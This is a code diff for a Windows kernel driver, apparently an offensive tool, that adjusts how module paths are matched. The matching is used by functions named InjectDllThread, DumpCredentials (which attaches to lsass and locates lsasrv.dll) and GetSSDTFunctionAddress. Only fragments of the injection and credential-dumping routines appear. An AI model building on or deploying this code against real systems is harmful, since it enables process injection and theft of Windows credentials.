@@ -131,7 +131,7 @@ NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
 		return status;
 
 	KeStackAttachProcess(TargetProcess, &state);
-	PVOID kernel32Base = GetModuleBase(TargetProcess, L"C:\\Windows\\System32\\kernel32.dll");
+	PVOID kernel32Base = GetModuleBase(TargetProcess, L"\\Windows\\System32\\kernel32.dll");
 
 	if (!kernel32Base) {
 		KeUnstackDetachProcess(&state);
@@ -645,7 +645,7 @@ NTSTATUS MemoryUtils::DumpCredentials(ULONG* AllocationSize) {
 
 	KeStackAttachProcess(lsass, &state);
 	do {
-		PVOID lsasrvBase = GetModuleBase(lsass, L"C:\\Windows\\System32\\lsasrv.dll");
+		PVOID lsasrvBase = GetModuleBase(lsass, L"\\Windows\\System32\\lsasrv.dll");
 
 		if (!lsasrvBase) {
 			status = STATUS_NOT_FOUND;
@@ -1197,7 +1197,7 @@ PVOID MemoryUtils::GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
 		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
 		if (pEntry->FullDllName.Length > 0) {
-			if (_wcsnicmp(pEntry->FullDllName.Buffer, moduleName, pEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+			if (IsIContained(pEntry->FullDllName, moduleName)) {
 				moduleBase = pEntry->DllBase;
 				break;
 			}
@@ -1285,7 +1285,7 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 
 	// Attaching to the process's stack to be able to walk the PEB.
 	KeStackAttachProcess(CsrssProcess, &state);
-	PVOID ntdllBase = GetModuleBase(CsrssProcess, L"C:\\Windows\\System32\\ntdll.dll");
+	PVOID ntdllBase = GetModuleBase(CsrssProcess, L"\\Windows\\System32\\ntdll.dll");
 
 	if (!ntdllBase) {
 		KeUnstackDetachProcess(&state);
